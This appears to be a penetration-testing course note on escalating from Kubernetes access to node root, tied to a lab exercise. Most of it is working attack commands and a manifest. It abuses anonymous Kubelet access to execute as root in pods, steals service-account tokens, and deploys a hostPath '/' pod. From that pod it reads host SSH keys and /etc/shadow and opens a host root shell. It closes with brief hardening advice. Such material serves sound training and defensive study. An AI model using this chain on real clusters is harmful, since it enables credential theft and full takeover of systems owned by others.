# Section 16 — Kubernetes (K8s)

> **No lab / no questions** — technique section. Sibling of §14 (LXD) / §15 (Docker): container-orchestration access ⇒ host/cluster root. (Real lab: HTB *Steamcloud*.)

## Recon — find the cluster ports

| Component | Port |
|-----------|------|
| etcd | 2379, 2380 |
| **API server** (`kube-apiserver`) | **6443** |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| **Kubelet API** | **10250** |
| Read-only Kubelet API | 10255 |

```bash
nmap -p 2379,2380,6443,10250,10251,10252,10255 -sV <node-ip>
curl -sk https://<ip>:6443/        # 403 system:anonymous = API server up, anon denied
curl -sk https://<ip>:10250/pods | jq .   # Kubelet often allows ANONYMOUS -> pod list
```
> The **Kubelet API (10250)** defaulting to **anonymous access** is the key misconfig — unauthenticated `/pods` leaks pod/namespace/image names and the last-applied config (sometimes secrets/tokens). The API server (6443) is usually locked to authenticated users.

---

## Step 1 — Enumerate pods (kubeletctl)

```bash
# get kubeletctl: github.com/cyberark/kubeletctl
kubeletctl -i --server <ip> pods            # list pods/namespaces/containers
kubeletctl -i --server <ip> scan rce        # which pods allow command exec via Kubelet
kubeletctl -i --server <ip> exec "id" -p <pod> -c <container>   # often uid=0(root)
```
> `scan rce` flags pods whose Kubelet `exec` endpoint runs commands (commonly **as root inside the container**). That's your foothold container.

---

## Step 2 — Steal the service-account token + CA

Every pod mounts its SA credentials at `/var/run/secrets/kubernetes.io/serviceaccount/`:

```bash
kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> | tee k8.token
kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"  -p <pod> -c <container> | tee ca.crt
```

---

## Step 3 — Check rights against the API server

```bash
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 auth can-i --list
```
> Look for **`pods [get create list]`** (or `*`). `create` on pods = game over: you can schedule a pod that mounts the host filesystem.

---

## Step 4 — Privileged pod → host root (the escalation)

`privesc.yaml` — bind-mount host `/` into the pod:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2          # use an image already present (imagePullPolicy: Never if offline)
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 get pods   # wait Running
# host filesystem is now at /root inside the privesc pod:
kubeletctl --server <ip> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc      # steal host root key
kubeletctl --server <ip> exec "cat /root/etc/shadow" -p privesc -c privesc
kubeletctl --server <ip> exec "chroot /root /bin/bash -c 'id; cat /root/flag.txt'" -p privesc -c privesc
```
> `hostPath: path: /` mounts the **node's root FS** into the pod at `/root` → read host SSH keys / shadow / flags, write `authorized_keys`/`sudoers`, or `chroot /root` for a full host-root shell. Reuse a present image (`nginx:1.14.2`) so no registry pull is needed. Then `ssh root@<node> -i stolen_key`.

---

## Exam / Engagement Notes

- **Kubelet 10250 anonymous = the way in** — `curl -sk https://<ip>:10250/pods` then `kubeletctl scan rce`.
- Foothold container is usually **root inside the pod**; the *real* prize is the **SA token** → `kubectl auth can-i --list`.
- **`create pods` permission ⇒ host root** via a `hostPath: /` pod (the universal K8s escape).
- Always reuse an image already on the node (offline clusters can't pull); `imagePullPolicy: Never`.
- Other leads: `/pods` last-applied-config (secrets), exposed `etcd:2379` (whole cluster state/secrets), `kubectl get secrets` if RBAC allows.
- Report note: disable Kubelet anonymous auth (`--anonymous-auth=false`), tighten RBAC (no `create pods` for app SAs), restrict `hostPath`.

---

## Quick reference

```
nmap -p6443,10250,2379 <ip>
curl -sk https://<ip>:10250/pods | jq '.items[].metadata.name'
kubeletctl -i --server <ip> scan rce
kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <ctr> | tee k8.token
kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <ctr> | tee ca.crt
kubectl --token=$(cat k8.token) --certificate-authority=ca.crt --server=https://<ip>:6443 auth can-i --list
kubectl ... apply -f privesc.yaml    # hostPath: / pod
kubeletctl --server <ip> exec "chroot /root sh -c 'cat /root/flag.txt'" -p privesc -c privesc
```

> One line: anon Kubelet (10250) → exec into a root pod → steal SA token → if you can `create pods`, schedule a `hostPath: /` pod → node root.
